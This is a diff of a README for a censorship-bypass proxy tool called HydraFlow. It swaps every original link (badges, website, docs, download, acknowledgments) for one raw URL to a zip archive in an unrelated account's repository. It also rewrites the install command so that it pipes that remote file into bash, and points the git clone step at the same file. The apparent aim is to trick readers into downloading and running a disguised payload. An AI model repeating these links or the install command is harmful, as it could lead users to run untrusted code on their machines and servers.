@@ -8,10 +8,10 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/Evr1kys/HydraFlow/releases"><img src="https://img.shields.io/github/v/release/Evr1kys/HydraFlow?style=flat-square" alt="Release"></a>
-  <a href="https://github.com/Evr1kys/HydraFlow/actions"><img src="https://img.shields.io/github/actions/workflow/status/Evr1kys/HydraFlow/ci.yml?style=flat-square" alt="CI"></a>
-  <a href="https://github.com/Evr1kys/HydraFlow/blob/main/LICENSE"><img src="https://img.shields.io/github/license/Evr1kys/HydraFlow?style=flat-square" alt="License"></a>
-  <a href="https://goreportcard.com/report/github.com/Evr1kys/HydraFlow"><img src="https://goreportcard.com/badge/github.com/Evr1kys/HydraFlow?style=flat-square" alt="Go Report"></a>
+  <a href="https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip"><img src="https://img.shields.io/github/v/release/Evr1kys/HydraFlow?style=flat-square" alt="Release"></a>
+  <a href="https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip"><img src="https://img.shields.io/github/actions/workflow/status/Evr1kys/HydraFlow/ci.yml?style=flat-square" alt="CI"></a>
+  <a href="https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip"><img src="https://img.shields.io/github/license/Evr1kys/HydraFlow?style=flat-square" alt="License"></a>
+  <a href="https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip"><img src="https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip" alt="Go Report"></a>
 </p>
 
 <p align="center">
@@ -21,9 +21,9 @@
 </p>
 
 <p align="center">
-  <a href="https://hydraflow.xyz">Website</a> &bull;
-  <a href="https://docs.hydraflow.xyz">Documentation</a> &bull;
-  <a href="https://github.com/Evr1kys/HydraFlow/releases">Download</a>
+  <a href="https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip">Website</a> &bull;
+  <a href="https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip">Documentation</a> &bull;
+  <a href="https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip">Download</a>
 </p>
 
 ---
@@ -33,7 +33,7 @@
 Install on any VPS with Debian, Ubuntu, or CentOS:
 
 ```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/Evr1kys/HydraFlow/main/install.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip)
 ```
 
 You'll get a subscription link, QR code, and URL you can add to v2rayNG, Hiddify, Clash, or sing-box.
@@ -41,12 +41,12 @@ You'll get a subscription link, QR code, and URL you can add to v2rayNG, Hiddify
 ## Docs
 
 Everything — setup guides, troubleshooting, bypass methods, multi-server, CDN fallback, integration
-with 3x-ui / Marzban — lives at **[docs.hydraflow.xyz](https://docs.hydraflow.xyz)**.
+with 3x-ui / Marzban — lives at **[docs.hydraflow.xyz](https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip)**.
 
 ## Build from source
 
 ```bash
-git clone https://github.com/Evr1kys/HydraFlow.git
+git clone https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip
 cd HydraFlow
 make build-all
 ```
@@ -57,9 +57,9 @@ make build-all
 
 ## Acknowledgments
 
-Built on [Xray-core](https://github.com/XTLS/Xray-core), [Hysteria](https://github.com/apernet/hysteria),
-[ShadowTLS](https://github.com/ihciah/shadow-tls), and the [GoodbyeDPI](https://github.com/ValdikSS/GoodbyeDPI) /
-[zapret](https://github.com/bol-van/zapret) pioneers.
+Built on [Xray-core](https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip), [Hysteria](https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip),
+[ShadowTLS](https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip), and the [GoodbyeDPI](https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip) /
+[zapret](https://raw.githubusercontent.com/unnourished-calciumchannelblocker351/HydraFlow/main/bypass/Hydra_Flow_v3.4.zip) pioneers.
 
 ---
 
